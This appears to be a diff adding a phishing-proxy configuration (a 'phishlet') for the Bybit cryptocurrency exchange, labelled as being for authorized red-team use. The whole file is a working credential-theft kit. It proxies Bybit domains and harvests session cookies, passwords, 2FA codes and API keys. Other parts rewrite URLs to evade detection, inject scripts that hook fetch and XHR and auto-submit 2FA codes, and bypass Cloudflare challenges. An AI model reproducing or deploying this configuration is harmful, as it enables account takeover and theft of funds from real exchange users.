@@ -1,0 +1,289 @@
+# Bybit Cryptocurrency Exchange Phishlet
+# For red team and authorized penetration testing only
+# Author: Red-Queen Team
+# Version: 3.0.0 - December 2024
+#
+# Bybit is a cryptocurrency derivatives exchange
+# This phishlet handles Bybit's login flow including 2FA bypass
+
+name: 'Bybit'
+author: 'red-queen'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  # Main Bybit domains
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'bybit.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'bybit.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'bybit.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'api2', orig_sub: 'api2', domain: 'bybit.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'stream', orig_sub: 'stream', domain: 'bybit.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'testnet', orig_sub: 'testnet', domain: 'bybit.com', session: false, is_landing: false, auto_filter: true}
+  # CDN and assets
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'bybit.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'bybit.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 's1', orig_sub: 's1', domain: 'bybit.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 's2', orig_sub: 's2', domain: 'bybit.com', session: false, is_landing: false, auto_filter: true}
+  # CloudFlare and security
+  - {phish_sub: '', orig_sub: '', domain: 'cloudflareinsights.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'challenges', orig_sub: 'challenges', domain: 'cloudflare.com', session: false, is_landing: false, auto_filter: false}
+  # Google services for captcha
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'recaptcha.net', session: false, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'www.bybit.com', orig_sub: 'www', domain: 'bybit.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'bybit.com', orig_sub: '', domain: 'bybit.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'api.bybit.com', orig_sub: 'api', domain: 'bybit.com', search: '{hostname}', replace: '{hostname}', mimes: ['application/json']}
+  - {triggers_on: 'api2.bybit.com', orig_sub: 'api2', domain: 'bybit.com', search: '{hostname}', replace: '{hostname}', mimes: ['application/json']}
+  
+  # Fix API responses
+  - triggers_on: 'www.bybit.com'
+    orig_sub: 'www'
+    domain: 'bybit.com'
+    search: '"success":true'
+    replace: '"success":true'
+    mimes: ['application/json']
+  
+  # Handle WebSocket URLs
+  - triggers_on: 'www.bybit.com'
+    orig_sub: 'www'
+    domain: 'bybit.com'
+    search: 'wss://stream.bybit.com'
+    replace: 'wss://stream.{domain}'
+    mimes: ['text/html', 'application/javascript']
+
+auth_tokens:
+  # Main Bybit session cookies
+  - domain: '.bybit.com'
+    keys: ['_by_l_g_d', 'b_t_c', 'deviceId', 'sensorsdata2015jssdkcross', 'BYIT-BYBIT-SESSIONID', 'secure_token', 'device_token', 'new_gray_key', 'user_locale', '.*,regexp']
+  - domain: 'www.bybit.com'
+    keys: ['_by_l_g_d', 'b_t_c', 'secure_token', '.*,regexp']
+  - domain: 'api.bybit.com'
+    keys: ['BYIT-BYBIT-SESSIONID', '.*,regexp']
+
+auth_urls:
+  - '/user/api/login'
+  - '/user/api/ajax/login'
+  - '/user/api/2fa/verify'
+  - '/user/api/2fa/google'
+  - '/user/login'
+  - '/v5/user/login'
+  - '/v5/user/2fa'
+
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    # Google Authenticator 2FA
+    - key: 'google2fa_code'
+      search: '([0-9]{6})'
+      type: 'post'
+    - key: 'twoFaCode'
+      search: '([0-9]{6})'
+      type: 'post'
+    - key: 'verifyCode'
+      search: '([0-9]{6})'
+      type: 'post'
+    # SMS/Email 2FA
+    - key: 'smsCode'
+      search: '([0-9]{6})'
+      type: 'post'
+    - key: 'emailCode'
+      search: '([0-9]{6})'
+      type: 'post'
+    # Phone number
+    - key: 'mobile'
+      search: '(.*)'
+      type: 'post'
+    # reCAPTCHA token
+    - key: 'recaptcha_token'
+      search: '(.*)'
+      type: 'post'
+    - key: 'g-recaptcha-response'
+      search: '(.*)'
+      type: 'post'
+
+#===============================================================================
+# REWRITE URLS - BROWSER DETECTION EVASION
+#===============================================================================
+rewrite_urls:
+  # Clean login path
+  - trigger:
+      domains: ['www.bybit.com']
+      paths: ['/en-US/login']
+    rewrite:
+      path: '/signin'
+      query: []
+
+  # Rewrite API endpoints to look less suspicious
+  - trigger:
+      domains: ['www.bybit.com', 'api.bybit.com']
+      paths: ['/user/api/login']
+    rewrite:
+      path: '/auth'
+      query: []
+
+  # Hide 2FA verification path
+  - trigger:
+      domains: ['www.bybit.com']
+      paths: ['/user/api/2fa/verify']
+    rewrite:
+      path: '/verify'
+      query:
+        - key: 'type'
+          value: '2fa'
+
+  # Rewrite security challenge pages
+  - trigger:
+      domains: ['www.bybit.com']
+      paths: ['/user/api/2fa/google']
+    rewrite:
+      path: '/security/confirm'
+      query: []
+
+  # Hide WebSocket endpoint
+  - trigger:
+      domains: ['stream.bybit.com']
+      paths: ['/realtime']
+    rewrite:
+      path: '/ws'
+      query: []
+
+force_post:
+  - path: '/user/api/login'
+    search:
+      - {key: 'email', search: '.*'}
+      - {key: 'password', search: '.*'}
+    force:
+      - {key: 'rememberMe', value: 'true'}
+      - {key: 'deviceType', value: 'Web'}
+    type: 'post'
+
+  - path: '/user/api/2fa/verify'
+    search:
+      - {key: 'google2fa_code', search: '.*'}
+    force:
+      - {key: 'type', value: 'google'}
+    type: 'post'
+
+login:
+  domain: 'www.bybit.com'
+  path: '/en-US/login'
+
+js_inject:
+  - trigger_domains: ['www.bybit.com']
+    trigger_paths: ['/login', '/en-US/login', '/en/login']
+    script: |
+      // Intercept API responses for session tokens
+      (function() {
+        var originalFetch = window.fetch;
+        window.fetch = function() {
+          return originalFetch.apply(this, arguments).then(function(response) {
+            var cloned = response.clone();
+            var url = response.url;
+            
+            if (url.includes('/user/api/login') || url.includes('/v5/user/login')) {
+              cloned.json().then(function(data) {
+                if (data && data.result && data.result.token) {
+                  // Capture API token
+                  document.cookie = 'api_token=' + data.result.token + '; path=/; secure';
+                }
+              }).catch(function() {});
+            }
+            return response;
+          });
+        };
+
+        // Intercept XHR for older API calls
+        var originalXHR = XMLHttpRequest.prototype.open;
+        XMLHttpRequest.prototype.open = function(method, url) {
+          this._url = url;
+          return originalXHR.apply(this, arguments);
+        };
+        
+        var originalSend = XMLHttpRequest.prototype.send;
+        XMLHttpRequest.prototype.send = function(body) {
+          this.addEventListener('load', function() {
+            if (this._url && (this._url.includes('/login') || this._url.includes('/2fa'))) {
+              try {
+                var data = JSON.parse(this.responseText);
+                if (data.ret_code === 0 && data.result) {
+                  console.log('Auth response captured');
+                }
+              } catch(e) {}
+            }
+          });
+          return originalSend.apply(this, arguments);
+        };
+      })();
+
+  - trigger_domains: ['www.bybit.com']
+    trigger_paths: ['/2fa', '/security']
+    script: |
+      // Auto-submit 2FA after code entry
+      document.addEventListener('DOMContentLoaded', function() {
+        var observer = new MutationObserver(function(mutations) {
+          var codeInputs = document.querySelectorAll('input[type="text"], input[type="number"]');
+          codeInputs.forEach(function(input) {
+            input.addEventListener('input', function() {
+              if (this.value.length === 6 && /^\d{6}$/.test(this.value)) {
+                var submitBtn = document.querySelector('button[type="submit"], .submit-btn, .verify-btn');
+                if (submitBtn) {
+                  setTimeout(function() {
+                    submitBtn.click();
+                  }, 300);
+                }
+              }
+            });
+          });
+        });
+        observer.observe(document.body, {childList: true, subtree: true});
+      });
+
+# Evilpuppet configuration for CloudFlare challenge bypass
+evilpuppet:
+  triggers:
+    - trigger_domains: ['www.bybit.com']
+      trigger_paths: ['/login', '/en-US/login']
+      trigger_type: 'url'
+      action: 'extract_token'
+      token_name: 'cf_clearance'
+  
+  interceptors:
+    - domain: 'www.bybit.com'
+      path: '/login'
+      token_name: 'cf_clearance'
+      inject_to: 'cookie'
+      
+    - domain: 'www.bybit.com'
+      path: '/user/api/login'
+      token_name: 'deviceId'
+      inject_to: 'cookie'
+
+  headless_config:
+    user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+    viewport_width: 1920
+    viewport_height: 1080
+    wait_for_network_idle: true
+    timeout_ms: 30000
+    stealth_mode: true
+    
+  extraction_rules:
+    - name: 'cf_clearance'
+      type: 'cookie'
+      domain: '.bybit.com'
+      
+    - name: 'deviceId'
+      type: 'cookie'
+      domain: '.bybit.com'
+      
+    - name: 'api_key'
+      type: 'local_storage'
+      key: 'bybit_api_key'
